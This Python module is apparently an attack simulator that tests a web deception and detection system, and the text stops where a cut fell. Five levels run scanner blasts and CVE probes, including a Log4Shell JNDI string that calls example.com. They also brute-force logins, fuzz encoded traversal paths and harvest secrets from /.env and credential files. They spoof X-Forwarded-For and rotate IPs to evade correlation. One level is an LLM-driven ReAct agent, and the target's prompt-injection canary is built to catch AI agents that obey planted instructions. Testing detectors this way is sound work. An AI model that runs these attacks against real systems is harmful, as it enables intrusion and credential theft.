"""
Attack Simulator: 5 stealth levels calibrated on the Sentinel cascade.

Levels:
  noisy     · Naive scanner -> T0 Sigma immediate (UA + paths)
  evasive   · Masked bot -> T1 XGBoost (timing 500ms, 4xx ratio)
  stealth   · Slow agent -> T2 LLM only (timing 2500ms, encoded paths)
  ai-agent  · Real LLM brain via OVH AI Endpoints (genuine ReAct)
  apt       · Persistent threat -> shows the system's honest limits

Compatibility aliases:
  recon     -> noisy
  brute     -> evasive (brute-force POST)
  traversal -> evasive (LFI)
  ai-recon  -> ai-agent

Usage:
  python3 attack.py --target http://localhost:8080 --level ai-agent \\
    --ai-endpoint <OPENAI_COMPATIBLE_BASE_URL>/v1 \\
    --ai-key <TOKEN> --ai-model <MODEL_NAME> --duration 60
  # --ai-endpoint works with any OpenAI-compatible API (OpenAI, OVH AI Endpoints,
  # Together, Groq, a local vLLM/Ollama, …). The ai-agent level REQUIRES it: with no
  # endpoint/key the agent refuses to run (no scripted fallback). The non-LLM levels
  # (noisy/evasive/stealth/apt) need no key and are unaffected.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import random
import time

import httpx

from .agent_brain import AgentBrain
from .attack_state import AttackState
from .scenarios import scenario_naive_full, scenario_hardened_agent, scenario_apt_bypass
from .stealth_profiles import (
    PATHS_ENCODED_TRAVERSAL,
    PATHS_GHOST_SHELL,
    PATHS_LEGITIMATE,
    PATHS_OBVIOUS_RECON,
    PATHS_WIDE_ENUM,
    UA_SCANNERS,
    pick_ua,
    realistic_headers,
    timing_ai_agent,
    timing_apt,
    timing_evasive,
    timing_noisy,
    timing_stealth,
)
from .target_profiler import TargetProfile, probe_target

# ─── Simulated source IP (injected via X-Forwarded-For on ALL requests) ──
# Set at startup by --source-ip. Lets the dashboard create a separate session
# per attack run (Ghost Shell tracks by XFF).
_SOURCE_IP: str = ""

# Metrics service URL: if set (--metrics-url), the ai-agent level reports the REAL LLM
# usage (OVH `usage` field) after each call -> exact OVH EUR cost on the dashboard.
_METRICS_URL: str = ""

# Side file (JSONL) where the ai-agent level stores the full BODIES received, so the
# dashboard can show them in full on click (e.g. /.env). Set by --bodies-file.
_BODIES_FILE: str = ""
_BODY_SEQ: int = 0


def _apply_source_ip(headers: dict | None) -> dict:
    """Add X-Forwarded-For if --source-ip is set. Pass-through otherwise."""
    h = dict(headers or {})
    if _SOURCE_IP and "X-Forwarded-For" not in h and "x-forwarded-for" not in h:
        h["X-Forwarded-For"] = _SOURCE_IP
        h["X-Real-IP"] = _SOURCE_IP
    return h


async def _report_agent_usage(client: "httpx.AsyncClient", usage: dict | None, model: str) -> None:
    """Report the REAL LLM usage of the last call to the metrics service (best-effort, non-blocking).

    `usage` = {prompt_tokens, completion_tokens} returned by the OVH API. The session is keyed by
    the spoofed source IP (same key as Ghost/Sentinel), so the cost maps to the right session."""
    if not _METRICS_URL or not usage:
        return
    try:
        await client.post(
            f"{_METRICS_URL.rstrip('/')}/events/agent-usage",
            json={
                "session_id": _SOURCE_IP or "ai-agent",
                "prompt_tokens": int(usage.get("prompt_tokens", 0) or 0),
                "completion_tokens": int(usage.get("completion_tokens", 0) or 0),
                "model": model,
            },
            timeout=4.0,
        )
    except Exception:
        pass  # best-effort telemetry: never break the attack


def _record_body(method: str, path: str, status: int, body: str) -> None:
    """Store the full BODY of a response in the side JSONL file (best-effort).
    Lets the dashboard show the full content on click (e.g. /.env)."""
    global _BODY_SEQ
    if not _BODIES_FILE or not body:
        return
    _BODY_SEQ += 1
    rec = {"seq": _BODY_SEQ, "method": method, "path": path,
           "status": int(status or 0), "len": len(body), "body": body[:120_000]}
    try:
        with open(_BODIES_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ─── ANSI colors for demo readability ──────────────────────────

_CYAN = "\033[96m"
_GREEN = "\033[92m"
_YELLOW = "\033[93m"
_RED = "\033[91m"
_MAGENTA = "\033[95m"
_BLUE = "\033[94m"
_BOLD = "\033[1m"
_DIM = "\033[2m"
_RESET = "\033[0m"


def _banner(level: str, target: str, duration: int) -> None:
    colors = {
        "noisy": _RED,
        "evasive": _YELLOW,
        "stealth": _CYAN,
        "ai-agent": _MAGENTA,
        "apt": _BLUE,
    }
    c = colors.get(level, _RESET)
    tier_hint = {
        "noisy": "→ Detection: T0 Sigma immediate",
        "evasive": "→ Detection: T1 XGBoost (timing + 4xx burst)",
        "stealth": "→ Detection: T2 LLM (semantic pattern, T1 barely fires)",
        "ai-agent": "→ Detection: T2 LLM (genuine ReAct agent behavior)",
        "apt": "→ Detection: potentially bypasses all tiers (honest limits demo)",
    }
    print(f"\n{c}{_BOLD}{'═'*60}")
    print("  MIR[AI]GE · Attack Simulator")
    print(f"  Level  : {level.upper()}")
    print(f"  Target : {target}")
    print(f"  Duration : {duration}s")
    print(f"  {tier_hint.get(level, '')}")
    print(f"{'═'*60}{_RESET}\n")


def _log_req(level: str, method: str, path: str, status: int, size: int, *, extra: str = "") -> None:
    status_color = _GREEN if status == 200 else (_YELLOW if status < 500 else _RED)
    extra_str = f"  {_DIM}{extra}{_RESET}" if extra else ""
    print(
        f"  {_DIM}[{level.upper()[:6]}]{_RESET} "
        f"{method} {path} "
        f"→ {status_color}{status}{_RESET} "
        f"{_DIM}({size}b){_RESET}"
        f"{extra_str}"
    )


def _log_thought(thought: str) -> None:
    if not thought or "[no LLM" in thought:
        return
    lines = thought.replace("\n", " ").strip()
    print(f"  {_MAGENTA}[Thought]{_RESET} {_DIM}{lines[:160]}{_RESET}")


# Paths whose body we always want to show (decoy proof for the demo)
_SHOW_BODY_PATHS = {
    "/.env", "/.aws/credentials", "/.kube/config",
    "/notice_to_admins.txt", "/admin/acknowledge",
}

def _log_body(path: str, body: str) -> None:
    """Show a body snippet for key endpoints, making the decoy visible."""
    if not body or path not in _SHOW_BODY_PATHS:
        return
    snippet = body.replace("\n", " ").strip()[:220]
    print(f"  {_DIM}  └─ body: {snippet}…{_RESET}")


def _log_phase(name: str, hint: str = "") -> None:
    """Visually separate the phases of a kill-chain."""
    suffix = f" — {hint}" if hint else ""
    print(f"\n  {_CYAN}{_BOLD}╶─ phase: {name.upper()}{_RESET}{_CYAN}{suffix}{_RESET}")


def _log_profile(p: TargetProfile) -> None:
    """Show the detected target profile."""
    color = {"portal": _GREEN, "ghost": _MAGENTA, "unknown": _YELLOW}.get(p.kind, _DIM)
    print(f"  {_DIM}[Recon]{_RESET} cible identifiée : {color}{_BOLD}{p.kind.upper()}{_RESET}")
    if p.title: print(f"  {_DIM}        titre : {p.title}{_RESET}")
    if p.server or p.technology:
        bits = []
        if p.server: bits.append(f"server={p.server}")
        if p.technology: bits.append("tech=" + ",".join(p.technology))
        print(f"  {_DIM}        {' · '.join(bits)}{_RESET}")
    if p.links: print(f"  {_DIM}        {len(p.links)} liens HTML extraits{_RESET}")
    if p.forms: print(f"  {_DIM}        {len(p.forms)} formulaires (login={p.has_login}){_RESET}")
    if p.robots: print(f"  {_DIM}        robots.txt : {len(p.robots)} entrées{_RESET}")
    if p.set_cookies: print(f"  {_DIM}        cookies posés : {', '.join(p.set_cookies)}{_RESET}")


def _log_loot(state: AttackState, added: int, path: str) -> None:
    if added > 0:
        last = state.loot[-1]
        print(f"  {_GREEN}[Loot+{added}]{_RESET} {last.kind} extrait de {_DIM}{path}{_RESET} "
              f"→ {_YELLOW}{last.value[:60]}{_RESET}")


async def _send(
    client: httpx.AsyncClient,
    state: AttackState,
    method: str,
    url: str,
    *,
    label: str,
    headers: dict | None = None,
    data: dict | None = None,
    json_body: dict | None = None,
    silent_body: bool = False,
) -> tuple[int, str, dict]:
    """Wrapper that sends a request, updates state, and logs."""
    path = url[url.find("/", 8):] if url.startswith(("http://", "https://")) else url
    full_headers = _apply_source_ip(headers)
    # Reuse session cookies if available
    if state.cookies:
        full_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in state.cookies.items())

    try:
        if method == "POST":
            r = await client.post(url, headers=full_headers, data=data, json=json_body)
        elif method == "HEAD":
            r = await client.head(url, headers=full_headers)
        else:
            r = await client.get(url, headers=full_headers)
        body = r.text if "text/html" in r.headers.get("content-type", "") or len(r.content) < 8192 else ""
        state.record_request(path, r.status_code, len(r.content))
        state.harvest_cookies(r.headers.get("set-cookie", ""))
        added = state.harvest(path, body)
        _log_req(label, method, path, r.status_code, len(r.content))
        if not silent_body:
            _log_body(path, body)
        _log_loot(state, added, path)
        return r.status_code, body, dict(r.headers)
    except Exception as exc:
        print(f"  {_RED}[ERR]{_RESET} {method} {path} → {exc}")
        return 0, "", {}


def _print_killchain_summary(state: AttackState, level: str) -> None:
    """End banner with per-phase breakdown + loot."""
    s = state.summary_dict()
    print(f"\n  {_BOLD}{_CYAN}╶─ kill-chain résumé · {level.upper()}{_RESET}")
    print(f"  {_DIM}Durée :{_RESET} {s['duration_s']}s · "
          f"{_DIM}Requêtes :{_RESET} {s['requests_sent']} · "
          f"{_DIM}Bytes :{_RESET} {s['bytes_in']:,}")
    if s["phases"]:
        phases_str = " · ".join(f"{k}={v}" for k, v in s["phases"].items())
        print(f"  {_DIM}Phases :{_RESET} {phases_str}")
    if s["status_codes"]:
        codes_str = " · ".join(f"{k}={v}" for k, v in sorted(s["status_codes"].items()))
        print(f"  {_DIM}Statuts :{_RESET} {codes_str}")
    print(f"  {_DIM}Paths actifs :{_RESET} {s['working_paths']} · "
          f"{_DIM}Loot :{_RESET} {s['loot_count']} "
          f"({', '.join(s['loot_kinds']) if s['loot_kinds'] else 'aucun'})")


# ─── Level 1: NOISY ─────────────────────────────────────────────────────

async def level_noisy(target: str, duration: int, rps: int = 30, **_) -> None:
    """
    Multi-phase naive scanner: the typical kill-chain of a kiddo with Nuclei/Nikto.

    Phase 1 (fingerprint, ~3s)  : 1 GET / to identify the stack
    Phase 2 (scanner blast)     : chains Nuclei-style on obvious Sigma paths
    Phase 3 (cve probe)         : if /admin exists -> classic CVEs (log4shell, struts, etc.)

    Expected Sentinel cascade:
      T0 : scanner_user_agents.yml (medium) + recon_endpoints.yml (medium) cumulative hits
      T1 : rate_rps > 20 (+0.25) + timing < 1700ms (+0.35) + sigma_hits (+0.25) >= 0.85
      -> direct MTD (T2 not invoked)
    """
    _banner("noisy", target, duration)
    state = AttackState()
    base = target.rstrip("/")
    start = time.time()

    async with httpx.AsyncClient(timeout=4.0, follow_redirects=False) as client:
        # ── Phase 1: Fingerprint ─────────────────────────────────────
        state.phase = "fingerprint"
        _log_phase("fingerprint", "1 GET / pour identifier la pile")
        state.target_profile = await probe_target(client, target,
                                                  user_agent=random.choice(UA_SCANNERS),
                                                  deep=False)
        _log_profile(state.target_profile)

        # ── Phase 2: Scanner blast ───────────────────────────────────
        state.phase = "scanner_blast"
        # If a Ghost Shell is detected, add its paths to the pool
        path_pool = list(PATHS_OBVIOUS_RECON + PATHS_WIDE_ENUM[:8])
        if state.target_profile.kind == "ghost":
            path_pool += PATHS_GHOST_SHELL
            _log_phase("scanner_blast", "ghost détecté → enrichit avec paths Ghost Net")
        else:
            _log_phase("scanner_blast", "Nuclei-style · UA scanner · ~30 RPS")

        idx = 0
        cve_targets: list[str] = []   # responding paths -> CVE probe phase 3
        while time.time() - start < duration * 0.75:
            path = path_pool[idx % len(path_pool)]
            ua = random.choice(UA_SCANNERS)
            status, _, _ = await _send(client, state, "GET",
                                       f"{base}{path}", label="noisy",
                                       headers={"User-Agent": ua})
            if 200 <= status < 300 and path in ("/admin", "/swagger", "/api-docs",
                                                "/server-status", "/.env"):
                cve_targets.append(path)
            idx += 1
            await asyncio.sleep(timing_noisy())
            if time.time() - start >= duration:
                break

        # ── Phase 3: CVE probe ───────────────────────────────────────
        if cve_targets and time.time() - start < duration:
            state.phase = "cve_probe"
            _log_phase("cve_probe", f"{len(cve_targets)} surfaces ouvertes — tente CVE classiques")
            cve_paths = [
                # Log4Shell hint via header
                "/api/v1/users?id=${jndi:ldap://example.com/x}",
                # Struts2 OGNL
                "/struts2-showcase/showcase.action",
                # Spring4Shell hint
                "/?class.module.classLoader.URLs%5B0%5D=x",
                # ShellShock
                "/cgi-bin/test.sh",
                # phpMyAdmin
                "/phpmyadmin/index.php",
            ]
            for p in cve_paths:
                if time.time() - start >= duration: break
                await _send(client, state, "GET", f"{base}{p}", label="noisy:cve",
                            headers={"User-Agent": random.choice(UA_SCANNERS),
                                     "X-Forwarded-For": "127.0.0.1"})
                await asyncio.sleep(timing_noisy())

    _print_killchain_summary(state, "noisy")


# ─── Level 2: EVASIVE ───────────────────────────────────────────────────

async def level_evasive(target: str, duration: int, rps: int = 8, **_) -> None:
    """
    Multi-phase masked bot. Fixed browser UA + login brute-force + targeted LFI.

    Phase 1 (warmup)            : 3 legitimate hits to set a cookie
    Phase 2 (form bust)         : if login form -> progressive brute force (back-off)
    Phase 3 (path fuzz)         : 8 RPS fuzzing on sensitive surfaces + robots.txt endpoints

    Expected cascade:
      T0 : no direct hit (clean UA)
      T1 : inter_arrival ~500ms (+0.35) + ratio_4xx ~0.45 (+0.10)
             + unique_path_ratio ~0.75 (+0.05) + ua_entropy < 0.5 (+0.10) -> ~0.60
      T2 : LLM detects the bot-speed fuzzing pattern
    """
    _banner("evasive", target, duration)
    state = AttackState()
    base = target.rstrip("/")
    start = time.time()
    # Single UA -> low entropy -> T1 bot signal
    fixed_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"

    async with httpx.AsyncClient(timeout=4.0, follow_redirects=True) as client:
        # ── Phase 1: Warmup ─────────────────────────────────────────
        state.phase = "warmup"
        _log_phase("warmup", "se faire passer pour un navigateur classique")
        state.target_profile = await probe_target(client, target, user_agent=fixed_ua, deep=True)
        _log_profile(state.target_profile)
        # Grab the session cookie via the probe
        for ck in state.target_profile.set_cookies:
            pass  # already captured by _send later on

        for path in ("/", "/login", "/static/logo.png"):
            if time.time() - start >= duration: break
            await _send(client, state, "GET", f"{base}{path}", label="evasive:warm",
                        headers=realistic_headers(fixed_ua))
            await asyncio.sleep(random.uniform(0.8, 1.5))

        # ── Phase 2: Form bust (if login form detected) ──────────────
        login_form = next(
            (f for f in state.target_profile.forms
             if any(fn.lower() in ("password", "passwd", "pwd") for fn in f.fields)),
            None,
        )
        if login_form and time.time() - start < duration * 0.6:
            state.phase = "form_bust"
            user_field = next((f for f in login_form.fields
                               if f.lower() in ("username", "user", "email", "login")), "username")
            pwd_field = next((f for f in login_form.fields
                              if f.lower() in ("password", "passwd", "pwd")), "password")
            action = login_form.action if login_form.action.startswith("/") else "/login"
            _log_phase("form_bust", f"POST {action} · {user_field}/{pwd_field}")
            for user, pwd in state.credentials_for_login()[:12]:
                if time.time() - start >= duration: break
                status, body, _ = await _send(
                    client, state, "POST", f"{base}{action}",
                    label="evasive:auth",
                    headers={**realistic_headers(fixed_ua),
                             "Content-Type": "application/x-www-form-urlencoded"},
                    data={user_field: user, pwd_field: pwd},
                    silent_body=True,
                )
                # sign of a successful auth
                if status in (200, 302) and any(kw in body.lower() for kw in
                                                 ("welcome", "dashboard", "logout")):
                    print(f"  {_GREEN}[Auth]{_RESET} couple valide trouvé : "
                          f"{_BOLD}{user}:{pwd}{_RESET}")
                    break
                await asyncio.sleep(timing_evasive())

        # ── Phase 3: Tech-oriented path fuzz ────────────────────────
        state.phase = "path_fuzz"
        # Pool depends on the detected tech
        fuzz_pool = list(PATHS_WIDE_ENUM) + [
            "/backup.sql", "/config.bak", "/debug", "/console",
            "/phpmyadmin", "/cpanel", "/.htpasswd", "/config.yml",
            "/app/config", "/api/internal/admin",
        ]
        # Contextual enrichment
        if "FastAPI" in (state.target_profile.technology or []):
            fuzz_pool += ["/openapi.json", "/docs", "/redoc", "/api/v1/health"]
        if state.target_profile.kind == "ghost":
            fuzz_pool += PATHS_GHOST_SHELL
        # robots.txt also feeds the pool
        fuzz_pool += [p for p in state.target_profile.robots if p.startswith("/")]
        _log_phase("path_fuzz", f"fuzz {len(fuzz_pool)} candidats · timing 500ms")

        idx = 0
        while time.time() - start < duration:
            path = fuzz_pool[idx % len(fuzz_pool)]
            await _send(client, state, "GET", f"{base}{path}", label="evasive",
                        headers={"User-Agent": fixed_ua})
            idx += 1
            await asyncio.sleep(timing_evasive())

    _print_killchain_summary(state, "evasive")


# ─── Level 3: STEALTH ───────────────────────────────────────────────────

async def level_stealth(target: str, duration: int, **_) -> None:
    """
    Slow, methodical, context-aware agent. Crawl -> analyze -> exploit.

    Phase 1 (deep recon)        : initial crawl, parse robots.txt, extract HTML links
    Phase 2 (link follow)       : browses found links like a curious human
    Phase 3 (sensitive probe)   : 1 encoded path per 4-5 requests (LFI, traversal)
    Phase 4 (loot exploit)      : if creds found in the HTML, tries them

    Expected cascade:
      T0 : a few medium hits via encoded traversal (1 in 5)
      T1 : rate_rps ~2 (0) + inter_arrival ~2500ms (+0.10) + unique_path_ratio ~0.90 (+0.15)
             + sigma_hits 1-3 (+0.10) + ratio_4xx ~0.35 (+0.10) -> ~0.45
      T2 : LLM identifies the methodical exploration
    """
    _banner("stealth", target, duration)
    state = AttackState()
    base = target.rstrip("/")
    start = time.time()

    async with httpx.AsyncClient(timeout=8.0, follow_redirects=True) as client:
        # ── Phase 1: Deep recon ───────────────────────────────────
        state.phase = "recon"
        _log_phase("recon", "crawl HTML + robots.txt + extraction de liens")
        state.target_profile = await probe_target(client, target,
                                                  user_agent=pick_ua("stealth"), deep=True)
        _log_profile(state.target_profile)

        # Build the exploration queue: HTML links + robots + legitimate paths
        crawl_queue: list[str] = []
        for p in state.target_profile.links: crawl_queue.append(p)
        for p in state.target_profile.robots:
            if p.startswith("/") and p not in crawl_queue: crawl_queue.append(p)
        for p in PATHS_LEGITIMATE:
            if p not in crawl_queue: crawl_queue.append(p)

        # ── Phase 2: Link follow (curious human behavior) ──────
        state.phase = "link_follow"
        _log_phase("link_follow", f"{len(crawl_queue)} URLs candidates · UA rotation à chaque hop")
        idx = 0
        while crawl_queue and time.time() - start < duration * 0.45:
            path = crawl_queue.pop(0)
            ua = pick_ua("stealth")
            await _send(client, state, "GET", f"{base}{path}", label="stealth:nav",
                        headers=realistic_headers(ua))
            idx += 1
            await asyncio.sleep(timing_stealth())

        # ── Phase 3: Sensitive probe (1 in 4-5) ────────────────────
        if time.time() - start < duration:
            state.phase = "sensitive_probe"
            _log_phase("sensitive_probe", "LFI/traversal encodé entrelacé · 1 sur 5")
            counter = 0
            while time.time() - start < duration * 0.85:
                if counter % 5 == 4:
                    path = random.choice(PATHS_ENCODED_TRAVERSAL)
                else:
                    path = random.choice(PATHS_LEGITIMATE + PATHS_WIDE_ENUM[:8])
                ua = pick_ua("stealth")
                await _send(client, state, "GET", f"{base}{path}", label="stealth:probe",
                            headers=realistic_headers(ua))
                counter += 1
                await asyncio.sleep(timing_stealth())

        # ── Phase 4: Loot exploit (if anything found) ──────────────────
        if state.loot and time.time() - start < duration:
            state.phase = "loot_exploit"
            _log_phase("loot_exploit",
                       f"{len(state.loot)} secrets trouvés — tente exploitation")
            for l in state.loot[:5]:
                if time.time() - start >= duration: break
                # Re-hit the source to confirm the leak
                await _send(client, state, "GET", f"{base}{l.source_path}",
                            label=f"stealth:loot:{l.kind}",
                            headers=realistic_headers(pick_ua("stealth")))
                await asyncio.sleep(timing_stealth())

    _print_killchain_summary(state, "stealth")


# ─── Level 4: AI-AGENT ──────────────────────────────────────────────────

async def level_ai_agent(
    target: str,
    duration: int,
    brain: AgentBrain | None = None,
    **_,
) -> None:
    """
    ReAct agent driven by a real LLM via OVH AI Endpoints.

    The LLM brain receives each HTTP observation and generates the next action
    (Thought -> Action -> Observation). The agent remembers the credentials and hints
    it finds and adapts its exploration accordingly.

    Expected cascade (varies by LLM model):
      T0 : if the agent explores /.aws/credentials -> recon_endpoints (medium)
           if the agent follows the PI canary -> T0 critical immediate
      T1 : typical LLM timing 1.5 to 2.5s -> around the 1700ms threshold
      T2 : recognizable semantic pattern of a methodical agent
    """
    _banner("ai-agent", target, duration)
    if not (brain and brain.enabled):
        print(f"  {_RED}{_BOLD}[ai-agent] Indisponible : aucun endpoint LLM configuré.{_RESET}")
        print(f"  {_DIM}Renseigne --ai-endpoint + --ai-key (API compatible OpenAI : OVH AI Endpoints, "
              f"OpenAI, vLLM/Ollama local…). Pas d'attaque scriptée de repli — c'est volontaire "
              f"(un faux agent fausserait la conso et les métriques).{_RESET}")
        return
    print(f"  {_MAGENTA}[Brain]{_RESET} LLM actif : {brain.model}")
    est_steps = duration // 6
    print(f"  {_DIM}Durée : {duration}s · ~{est_steps} steps estimés (latence API ~2-5s + timing 1.8s){_RESET}")
    print(f"  {_DIM}Cycle ReAct : Thought → Action → Observation · loot tracking actif{_RESET}\n")

    state = AttackState()
    base = target.rstrip("/")
    start = time.time()
    method, path, resp_text, status = "GET", "/", "", 200

    async with httpx.AsyncClient(timeout=12.0, follow_redirects=False) as client:
        # ── Phase 1: Recon before the ReAct cycle ─────────────────────────
        state.phase = "recon"
        _log_phase("recon", "1 GET / pour briefer le LLM sur la cible")
        state.target_profile = await probe_target(client, target,
                                                  user_agent=pick_ua("ai-agent"), deep=False)
        _log_profile(state.target_profile)
        if state.target_profile.kind == "ghost":
            print(f"  {_MAGENTA}[!]{_RESET} Profile=GHOST → l'agent va probablement déclencher des compute-wasting "
                  "mécanismes (calibration, overthinking, canary).")

        # ── Phase 2: LLM-driven ReAct cycle ───────────────────
        state.phase = "react"
        canary_triggered = False
        acted_once = False           # has the LLM produced AT LEAST one usable action?
        consecutive_failures = 0
        MAX_CONSECUTIVE_FAILURES = 3
        while time.time() - start < duration:
            # 1. Next action decided by the LLM (brain guaranteed active here)
            action = await brain.next_action(
                method=method, path=path, status=status, body=resp_text,
            )
            # REAL LLM usage of this call -> metrics (exact OVH EUR cost, self-triggered)
            await _report_agent_usage(client, brain.last_usage, brain.model)

            if action is None:
                consecutive_failures += 1
                # Failure on the VERY FIRST call -> unreachable endpoint / invalid key / unknown
                # model: BLOCK right away instead of looping and spamming errors.
                if not acted_once:
                    print(f"  {_RED}{_BOLD}[ai-agent] Endpoint LLM injoignable ou réponse invalide "
                          f"dès le premier appel — attaque annulée.{_RESET}")
                    print(f"  {_DIM}Vérifie --ai-endpoint (URL complète http(s)://…/v1), --ai-key et "
                          f"--ai-model. Aucune attaque lancée.{_RESET}")
                    return
                # Endpoint that drops out mid-run: tolerate a few misses then give up.
                if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
                    print(f"  {_RED}{_BOLD}[ai-agent] {MAX_CONSECUTIVE_FAILURES} échecs LLM consécutifs "
                          f"— attaque arrêtée.{_RESET}")
                    return
                await asyncio.sleep(timing_ai_agent())
                continue

            consecutive_failures = 0
            acted_once = True
            _log_thought(action.thought)

            ua = pick_ua("ai-agent")
            headers = realistic_headers(ua)
            status, resp_text, _ = await _send(
                client, state, action.method, f"{base}{action.path}",
                label="ai-agent",
                headers=headers,
                json_body=(action.body or {}) if action.method == "POST" else None,
            )
            method, path = action.method, action.path
            _record_body(method, path, status, resp_text)   # full body -> side file (shown on click in the dashboard)

            # PI canary: prominent banner
            if action.path == "/admin/acknowledge" and status in (200, 201) and not canary_triggered:
                canary_triggered = True
                elapsed = time.time() - start
                print(f"\n  {_RED}{_BOLD}{'▓'*58}")
                print("  ▓  🪤  CANARY TRIGGERED — AI AGENT CONFIRMED               ▓")
                print("  ▓  Méc. #13 · Reverse Prompt Injection compliance           ▓")
                print(f"  ▓  t+{elapsed:.0f}s · src: {ua[:30]:<30}  ▓")
                print("  ▓  Ghost Net now escalates compute-wasting aggression       ▓")
                print(f"  {'▓'*58}{_RESET}\n")
            elif resp_text and ("IMPORTANT" in resp_text or "acknowledge" in resp_text.lower()):
                print(f"  {_RED}[!]{_RESET} Canary PI détecté dans la réponse ↑ — l'agent va obéir")

            await asyncio.sleep(timing_ai_agent())

    _print_killchain_summary(state, "ai-agent")


# ─── Level 5: APT ───────────────────────────────────────────────────────

async def level_apt(target: str, duration: int, **_) -> None:
    """
    Advanced persistent threat: IP rotation, benign browsing, extended ops.

    Phase 1 (cover establish)   : 4-6 benign hits from different IPs (mimics residual traffic)
    Phase 2 (long-and-low)      : 1 sensitive probe every 8 requests, different IP/UA
    Phase 3 (lateral)           : if one IP successfully hit a sensitive endpoint,
                                  ANOTHER IP follows up so they don't look related

    Shows Sentinel's HONEST LIMITS: it can slip under the radar.

    Expected cascade:
      T0 : no hit (clean UA, 1 sensitive path every 8 reqs)
      T1 : rate_rps < 0.5 (0) + inter_arrival > 5000ms (0) + ratio_4xx < 0.20 (0) -> ~0.0
      T2 : no escalation
    """
    _banner("apt", target, duration)
    state = AttackState()
    base = target.rstrip("/")
    start = time.time()

    def fake_ip() -> str:
        return f"{random.choice([10, 192, 172])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    print(f"  {_DIM}UA: full rotation + légitimes · timing: 5–15s gaussien · IP rotative{_RESET}")
    print(f"  {_YELLOW}Note:{_RESET} ce niveau peut ne PAS être détecté — c'est intentionnel.\n")

    async with httpx.AsyncClient(timeout=12.0, follow_redirects=False) as client:
        # ── Phase 1: Cover establish ─────────────────────────────────
        state.phase = "cover"
        _log_phase("cover", "se fondre dans le trafic résiduel · UA + IP variées")
        state.target_profile = await probe_target(client, target,
                                                  user_agent=pick_ua("apt"), deep=True)
        _log_profile(state.target_profile)

        # Pool: almost only benign paths
        cover_pool = ["/", "/login", "/about", "/contact", "/favicon.ico",
                      "/static/logo.png", "/api/v1/health", "/robots.txt"]
        # Enrich with the real links found
        cover_pool += [p for p in state.target_profile.links if not p.endswith(".js")][:6]

        for _ in range(6):
            if time.time() - start >= duration: break
            path = random.choice(cover_pool)
            ua = pick_ua("apt")
            ip = fake_ip()
            await _send(client, state, "GET", f"{base}{path}", label="apt:cover",
                        headers={**realistic_headers(ua), "X-Forwarded-For": ip})
            d = timing_apt() * 0.6  # cover phase a bit faster
            print(f"  {_DIM}  → next cover probe in {d:.1f}s{_RESET}")
            await asyncio.sleep(min(d, max(1.0, duration - (time.time() - start))))

        # ── Phase 2: Long-and-low (targeted sensitive probe every 8) ──
        if time.time() - start < duration:
            state.phase = "long_low"
            _log_phase("long_low", "1 probe sensible / 8 · timing 5-15s · vise sous le seuil T1")
            idx = 0
            sensitive_hits: list[tuple[str, str]] = []  # (path, ip_used)
            while time.time() - start < duration * 0.85:
                if idx % 8 == 0:
                    path = random.choice(PATHS_OBVIOUS_RECON[:5] + PATHS_ENCODED_TRAVERSAL[:2])
                    sensitive = True
                else:
                    path = random.choice(cover_pool)
                    sensitive = False
                ua = pick_ua("apt")
                ip = fake_ip()
                status, _, _ = await _send(client, state, "GET",
                                           f"{base}{path}", label="apt:probe",
                                           headers={**realistic_headers(ua),
                                                    "X-Forwarded-For": ip})
                if sensitive and 200 <= status < 300:
                    sensitive_hits.append((path, ip))
                idx += 1
                delay = timing_apt()
                print(f"  {_DIM}  → next probe in {delay:.1f}s ({state.phase}){_RESET}")
                await asyncio.sleep(min(delay, max(1.0, duration - (time.time() - start))))

            # ── Phase 3: Lateral (other IPs revisit the hits) ───
            if sensitive_hits and time.time() - start < duration:
                state.phase = "lateral"
                _log_phase("lateral",
                           f"{len(sensitive_hits)} cibles sensibles confirmées — revisite via IPs tierces")
                for path, original_ip in sensitive_hits[:3]:
                    if time.time() - start >= duration: break
                    # Different IP to break the correlation
                    new_ip = fake_ip()
                    while new_ip == original_ip:
                        new_ip = fake_ip()
                    ua = pick_ua("apt")
                    await _send(client, state, "GET", f"{base}{path}",
                                label="apt:lateral",
                                headers={**realistic_headers(ua),
                                         "X-Forwarded-For": new_ip,
                                         "X-Real-IP": new_ip})
                    print(f"  {_DIM}  ↪ lateral via {new_ip} (initial: {original_ip}){_RESET}")
                    await asyncio.sleep(min(timing_apt(), max(1.0, duration - (time.time() - start))))

    _print_killchain_summary(state, "apt")


# ─── Compatibility aliases ────────────────────────────────────────────────

async def pattern_recon(target: str, rps: int, duration_s: int) -> None:
    """Alias -> level_noisy."""
    await level_noisy(target, duration_s, rps=rps)


async def pattern_brute(target: str, rps: int, duration_s: int) -> None:
    """Brute-force POST /login."""
    _banner("brute", target, duration_s)
    start = time.time()
    fixed_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    usernames = ["admin", "root", "administrator", "operator"]
    async with httpx.AsyncClient(timeout=3.0) as client:
        while time.time() - start < duration_s:
            url = f"{target.rstrip('/')}/login"
            data = {"username": random.choice(usernames), "password": f"pass_{random.randint(1000,9999)}"}
            try:
                resp = await client.post(url,
                    headers=_apply_source_ip({"User-Agent": fixed_ua}), data=data)
                _log_req("brute", "POST", "/login", resp.status_code, len(resp.content))
            except Exception as exc:
                print(f"  {_RED}[ERR]{_RESET} POST /login → {exc}")
            await asyncio.sleep(timing_evasive())


async def pattern_traversal(target: str, rps: int, duration_s: int) -> None:
    """Alias -> level_stealth with a traversal focus."""
    await level_stealth(target, duration_s)


async def pattern_ai_recon(target: str, rps: int, duration_s: int) -> None:
    """Alias -> level_ai_agent. Requires an LLM endpoint (env AI_ENDPOINTS_*);
    without a key, the agent refuses to run (no scripted fallback)."""
    ai_url = os.environ.get("AI_ENDPOINTS_BASE_URL", "")
    ai_key = os.environ.get("AI_ENDPOINTS_API_KEY", "")
    ai_model = (os.environ.get("AI_MODEL_GENERATOR", "")
                or os.environ.get("AI_MODEL_CLASSIFIER", "")
                or "Llama-3.1-8B-Instruct")
    brain = AgentBrain(base_url=ai_url, api_key=ai_key, model=ai_model)
    await level_ai_agent(target, duration_s, brain=brain)


# ─── Mapping ───────────────────────────────────────────────────────────────

LEVELS = {
